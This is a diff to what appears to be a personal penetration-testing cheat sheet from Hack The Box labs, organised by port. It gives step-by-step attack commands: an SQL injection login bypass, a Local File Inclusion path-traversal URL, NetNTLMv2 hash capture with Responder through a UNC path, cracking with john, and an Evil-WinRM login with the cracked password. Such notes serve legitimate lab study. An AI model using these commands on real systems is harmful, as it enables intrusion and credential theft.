@@ -26,6 +26,18 @@ PORT 80 - HTTP
         Username = admin'#
         Password = abc123 or anything
 
+    when a page includes a page=*.html page it could be vulnerable to Local File Inclusion (LFI) and have access to the system files
+        following "page=" insert the following "../../../../../../../../windows/system32/drivers/etc/hosts"
+        example: http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+
+        since the page is vulnerable to Inclusion and on a windows machine we can utilize SMB and capture the NetNTLMv2 when it attempts to auth.
+            run Responder "sudo python3 Responder.py -I tun0" once running,
+            send the page a request, example: "http://unika.htb/?page=//10.10.14.25/somefile" the 10.10 ip will be listed in Responer as "Responder IP" make sure that is updated
+            the Responder server should receive a encrypted responce from the webpage, save the responce to a hash.txt file "echo "responder responce" > hash.txt"
+            pass the hash to "john" and crack the password "john -w=/usr/share/wordlists/rockyou.txt hash.txt"
+            use Evil-WinRM to connect "evil-winrm -i {ipaddress} -u administrator -p badminton"
+
+
 PORT 445 - SMB
     smbclient - L {ipaddress} to list shares
     smbclient \\\\{ip}\\{share} to attempt to connect
@@ -62,3 +74,8 @@ PORT 27017 - MONGODB
         use {database name}; to select DB
         show collections; - to list info in DB
         db.flag.find().pretty(); to dump the contents of th DM
+
+
+OTHER:
+    echo "{ipaddress} {domain}" | sudo tee -a /etc/hosts    example: echo "10.129.128.223 unika.htb" | sudo tee -a /etc/hosts
+        resolve a hostname into an IP address 
